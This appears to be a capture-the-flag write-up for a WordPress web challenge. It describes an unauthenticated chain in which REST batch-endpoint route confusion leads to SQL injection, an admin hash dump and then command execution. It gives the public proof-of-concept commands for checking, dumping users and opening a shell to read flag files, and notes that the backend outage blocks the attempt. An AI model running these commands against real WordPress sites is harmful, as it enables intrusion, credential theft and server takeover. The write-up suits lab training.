# wordpress - CVE-2026-63030 "wp2shell" (pre-auth RCE)

| | |
|---|---|
| **Challenge** | wordpress |
| **Category** | WEB |
| **Points / Difficulty** | 100 / advanced |
| **Target** | http://wordpress.chal.deti:8084 (vhost; name-based) |
| **Vector** | CVE-2026-63030 + CVE-2026-60137 ("wp2shell") - unauthenticated WordPress core RCE |
| **Status** | **Vector identified & tooling ready; BLOCKED by backend outage (PHP down).** |

## Hint
> A blog, freshly seeded - the core beneath has not seen a patch in many moons.
> The flag lives outside the web root.

## Recon
- 8084 = Apache 2.4.67 (Debian) reverse-proxying a WordPress/PHP backend.
- Reports **WordPress 7.1.3, PHP 8.3.31**, multisite - but "not patched in many moons"
  + the RoE note that hosts may misrepresent versions means the core is really a
  **vulnerable 6.9.0-6.9.4 / 7.0.0-7.0.1** (the versions CVE-2026-63030 affects).
- Plugins: only `akismet` (default). Themes: `twentytwentythree`, `twentytwentyfour`
  (default). Near-stock install -> no vulnerable plugin/theme; the vuln is in **core**.
- Static files served by Apache even while PHP is down; dirs return 403 (no autoindex).

## The vulnerability (CVE-2026-63030 "wp2shell")
- **Unauthenticated core RCE, CVSS 9.8.** The REST **batch endpoint**
  `/wp-json/batch/v1` runs several sub-requests per call; a parsing quirk ("route
  confusion") makes one sub-request execute under another's handler. Chained with
  **CVE-2026-60137** (SQLi in `WP_Query`) -> unauthenticated SQL injection -> dumps
  `wp_users` (admin login + password hash) -> pass-the-hash to full command execution.
- Affected: WP 6.9.0-6.9.4, 7.0.0-7.0.1 (fixed 6.9.5 / 7.0.2). CISA KEV listed.

## Exploit path (planned - pending a PHP up-window)
Public PoC: `github.com/Icex0/wp2shell-poc` (stdlib Python; also Metasploit modules
and Nuclei templates exist).
```bash
git clone https://github.com/Icex0/wp2shell-poc && cd wp2shell-poc && pip install .
python3 wp2shell.py check http://wordpress.chal.deti:8084 --confirm-sqli
python3 wp2shell.py read  http://wordpress.chal.deti:8084 --preset users      # admin + hash
python3 wp2shell.py shell http://wordpress.chal.deti:8084 --user admin \
        --password '<hash>' --cmd 'id; find / -name "flag*" 2>/dev/null; cat /flag* 2>/dev/null'
```
Flag "outside the web root" => reached via the shell step (`cat /flag...`), not via
static HTTP. SQLi alone (hash dump) is not enough; need the RCE step for a file read.

## Blocker (report this)
The :8084 proxy returns a fixed 90-byte `Failed to daemonise ... No route to host (113)`
for every PHP request (`/`, `/wp-json/*`, `wp-login.php`) - the **PHP/WordPress backend
container is down/flapping**. wpscan caught one brief up-window (hence the 7.1.3/PHP
8.3.31/akismet detection), but it has since stayed down (5/5 and the PoC `check` both
hit the error). The backend is on `.72` and not student-controllable (portal
Reboot/Reconstruct only affects the student container). **wp2shell cannot run until the
PHP backend is restored.** Raise with the challenge author/TA; re-run the PoC in any
up-window.

## References
- Rapid7 / SecurityOnline / F5 Labs writeups on CVE-2026-63030; PoC Icex0/wp2shell-poc.
